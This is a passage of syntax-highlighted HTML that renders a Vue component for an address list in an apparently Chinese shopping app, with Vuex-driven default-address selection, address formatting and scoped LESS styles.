#9CDCFE">edit</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">onEdit</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-empty</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-else</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">description</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"空空如也"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">round</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"danger"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"bottom-button"</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">onAdd</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">添加地址</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-button</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-empty</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">Toast</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"vant"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">mapActions</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">mapGetters</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"vuex"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"AddressList"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 默认选中的地址id</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">chosenAddressId:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 地址列表</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">list:</span><span style="color: #D4D4D4"> [],</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 禁用状态的地址列表（超出快递范围）</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">disabledList:</span><span style="color: #D4D4D4"> [],</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">computed:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapGetters</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"AddressMap"</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">"codeToName"</span><span style="color: #D4D4D4">]),</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapGetters</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Address"</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">"getDefaultAddressId"</span><span style="color: #D4D4D4">]),</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">disabledText</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">disabledList</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">length</span><span style="color: #D4D4D4"> &gt; </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> ? </span><span style="color: #CE9178">"以下地址超出配送范围"</span><span style="color: #D4D4D4"> : </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">try</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 构建地区映射表</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">buildReverseMaps</span><span style="color: #D4D4D4">();</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 获取地址列表</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">response</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getAddressList</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log('获取地址列表成功：', response)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">addressData</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">response</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4"> || [];</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log('地址数据：', addressData)</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 格式化地址列表数据</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">addressData</span></span><span class="line"><span style="color: #D4D4D4">        .</span><span style="color: #DCDCAA">filter</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> !</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">is_disabled</span><span style="color: #D4D4D4">) </span><span style="color: #6A9955">// 过滤掉禁用的地址</span></span><span class="line"><span style="color: #D4D4D4">        .</span><span style="color: #DCDCAA">map</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> ({</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">id:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">address_id</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">tel:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">phone</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">address:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">formatAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">),</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">isDefault:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">is_default</span><span style="color: #D4D4D4"> || </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        }));</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 从Vuex中获取默认地址的id</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">defaultAddressId</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">getDefaultAddressId</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"默认地址id："</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">defaultAddressId</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">defaultAddressId</span><span style="color: #D4D4D4">) !== -</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 遍历比对列表每一项的id是否与defaultAddressId相等，找到后返回索引（强等于比较，注意类型）</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">defaultIndex</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">findIndex</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">          (</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">) === </span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">defaultAddressId</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">        );</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">defaultIndex</span><span style="color: #D4D4D4">) !== -</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #6A9955">// 找到后设置为默认地址</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">defaultIndex</span><span style="color: #D4D4D4">].</span><span style="color: #9CDCFE">isDefault</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">chosenAddressId</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">defaultAddressId</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// Vuex没有默认地址，则默认选中第一个地址</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"小主还没有默认地址哦</span><span style="color: #D7BA7D">\n</span><span style="color: #CE9178">快来设置一个吧❤️"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"未找到有效的默认地址"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">chosenAddressId</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">[</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">].</span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4"> || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 设置禁用的地址列表</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">disabledList</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">addressData</span></span><span class="line"><span style="color: #D4D4D4">        .</span><span style="color: #DCDCAA">filter</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">is_disabled</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">        .</span><span style="color: #DCDCAA">map</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> ({</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">id:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">address_id</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">tel:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">phone</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">address:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">formatAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">),</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">isDefault:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">is_default</span><span style="color: #D4D4D4"> || </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        }));</span></span><span class="line"><span style="color: #D4D4D4">    } </span><span style="color: #C586C0">catch</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.error('获取地址列表失败：', error)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">Toast</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">fail</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"获取地址列表失败"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">methods:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapActions</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Address"</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">"getAddressList"</span><span style="color: #D4D4D4">]),</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapActions</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"AddressMap"</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">"buildReverseMaps"</span><span style="color: #D4D4D4">]),</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 格式化地址：</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">formatAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">provinceName</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">codeToName</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">province_id</span><span style="color: #D4D4D4">) || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">cityName</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">codeToName</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">city_id</span><span style="color: #D4D4D4">) || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">countyName</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">codeToName</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">county_id</span><span style="color: #D4D4D4">) || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">detailAddress</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">detail</span><span style="color: #D4D4D4"> || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">result</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">`</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">provinceName</span><span style="color: #569CD6">}${</span><span style="color: #9CDCFE">cityName</span><span style="color: #569CD6">}${</span><span style="color: #9CDCFE">countyName</span><span style="color: #569CD6">}${</span><span style="color: #9CDCFE">detailAddress</span><span style="color: #569CD6">}</span><span style="color: #CE9178">`</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log('codeToname：', this.codeToName(item.province_id))</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">result</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">onAdd</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/address/edit?adsid="</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">onEdit</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log('跳转到编辑：', item)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">`/address/edit?adsid=</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">id</span><span style="color: #569CD6">}</span><span style="color: #CE9178">`</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D7BA7D">.custom-nav-bar</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#ffffff</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 导航栏背景色</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">50px</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 设置导航栏的高度</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">box-shadow</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">2px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">rgba</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0.1</span><span style="color: #D4D4D4">); </span><span style="color: #6A9955">// 添加阴影效果</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.address-list</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">60px</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 增加顶部内边距，以避免内容被导航栏遮挡</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.address-list-header</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#f8f8f8</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.header-text</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">left</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">/* 地址列表项样式 */</span></span><span class="line"><span style="color: #D7BA7D">.van-address-list__item</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 每一项之间的间距</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 内边距，使内容不贴边</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#ddd</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 边框颜色</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">4px</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 圆角边框</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 背景色</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.van-cell__title</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.van-cell__label</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">white-space</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">normal</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 允许内容换行</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">word-wrap</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">break-word</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 自动换行</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">word-break</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">break-all</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 长单词换行</span></span><span class="line"><span 